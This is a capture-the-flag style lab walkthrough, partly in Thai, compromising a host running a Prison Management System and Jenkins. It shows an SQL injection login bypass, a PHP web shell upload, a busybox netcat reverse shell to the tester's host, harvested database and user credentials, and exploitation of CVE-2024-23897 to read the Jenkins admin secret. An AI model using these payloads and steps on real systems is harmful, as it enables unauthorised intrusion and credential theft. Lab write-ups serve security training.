# Recon
## TCP Scan 

```bash
 sudo ../tools/scan.sh 192.168.193.103 
[*] Running rustscan...
[*] Running nmap on ports: 22,21,80,9443
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 23:15 EDT
Nmap scan report for 192.168.193.103
Host is up (0.034s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.227
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title:  Home - Prison Management System
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.84 seconds

```

## TCP 21 (FTP)
![[Pasted image 20250709101945.png]]

### config.xml
```xml
cat config.xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors/>
  <version>2.401.2</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>
  </authorizationStrategy>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>

```

## TCP 80 (HTTP)

![[Pasted image 20250709102216.png]]

## TCP 9443

![[Pasted image 20250709102502.png]]

![[Pasted image 20250709102525.png]]

![[Pasted image 20250709102636.png]]
### SQL injection

![[Pasted image 20250709102852.png]]


```payload
admin' OR 1=1 -- -
123456
```

![[Pasted image 20250709102928.png]]

### upload file

![[Pasted image 20250709103223.png]]

### Try to upload shell 

![[Pasted image 20250709111721.png]]

ดำเนินการ Inject ด้วย Burpsuite และแก้ไข Content จากชื่อไฟล์ shell.pHp.jpg เป้น shell.php
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
```

![[Pasted image 20250709111920.png]]

ตรวจสอบ Path อยู่ที่ `https://192.168.193.103:9443/uploadImage/shell.php?cmd=id`
![[Pasted image 20250709111952.png]]

# Shell as www-data

Shell Payload `busybox%20nc%20192.168.45.227%204444%20-e%20sh`
`https://192.168.193.103:9443/uploadImage/shell.php?cmd=busybox%20nc%20192.168.45.227%204444%20-e%20sh`
![[Pasted image 20250709112336.png]]

# Database Enum 

```bash
www-data@vmdak:/var/www/prison/database$ cat * | grep -i "pass"
define('DB_PASS','sqlCr3ds3xp0seD');
$dbh = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME,DB_USER, DB_PASS,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
$password = "sqlCr3ds3xp0seD";
$conn = mysqli_connect($servername, $username, $password, $dbname);
  `password` varchar(15) NOT NULL,
INSERT INTO `tblemployee` (`id`, `employeeID`, `fullname`, `password`, `sex`, `email`, `dob`, `phone`, `address`, `qualification`, `dept`, `employee_type`, `date_appointment`, `basic_salary`, `gross_pay`, `status`, `leave_status`, `photo`) VALUES
  `password` varchar(15) NOT NULL,
INSERT INTO `users` (`username`, `password`, `phone`, `fullname`, `photo`) VALUES
www-data@vmdak:/var/www/prison/database$ 
```

![[Pasted image 20250709112647.png]]

![[Pasted image 20250709112810.png]]

![[Pasted image 20250709112908.png]]

จากข้อมูล /etc/passwd จะเห็นได้ว่ามีเพียง User เดียวคือ vmdak ภายในระบบ 
`vmdak:RonnyCache001`

# Shell as vmdak 
![[Pasted image 20250709113221.png]]

# Local Port Forwarding 
![[Pasted image 20250709134104.png]]
จากข้อมูลข้างต้นจะเห็นว่ามี PORT 8080 ที่ไม่ได้เปิดจากภายนอกให้สามารถเข้าถึงได้ เราจึงมีความจำเป็นต้องทำ Local Port forwarding 

```bash
ssh -N -L 0.0.0.0:8080:127.0.0.1:8080 vmdak@192.168.193.103 
```

![[Pasted image 20250709134509.png]]

จากข้อมูลไฟล์ config.xml จะเห็นได้ว่า Jenkins ใช้เวอร์ชัน 2.401.2 ซึ่งเราจะพบว่ามีช่องโหว่ [CVE-2024-23897: Jenkins Arbitrary File Read](https://github.com/godylockz/CVE-2024-23897?source=post_page-----9c8a2bc4960a---------------------------------------) 

![[Pasted image 20250709135219.png]]

# expliot Jenkins web

```bash
git clone https://github.com/godylockz/CVE-2024-23897.git
┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://127.0.0.1:8080 
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file> /etc/passwd
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
sync:x:4:65534:sync:/bin:/bin/sync
ftp:x:111:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
vmdak:x:1000:1000::/home/vmdak:/bin/sh
games:x:5:60:games:/usr/games:/usr/sbin/nologin


file> /root/.jenkins/secrets/initialAdminPassword
140ef31373034d19a77baa9c6b84a200
file> 

```


# Jenkin Exploit 

![[Pasted image 20250709140035.png]]

เลือก New Item เพื่อสร้าง Build ใหม่ 

![[Pasted image 20250709140156.png]] 

ในช่อง Build Steps ให้เลือก Execute Shell และใส่ Reverse Shell 
![[Pasted image 20250709140314.png]]

![[Pasted image 20250709140449.png]]

เลือก BuildNow 

![[Pasted image 20250709140519.png]]

# PWN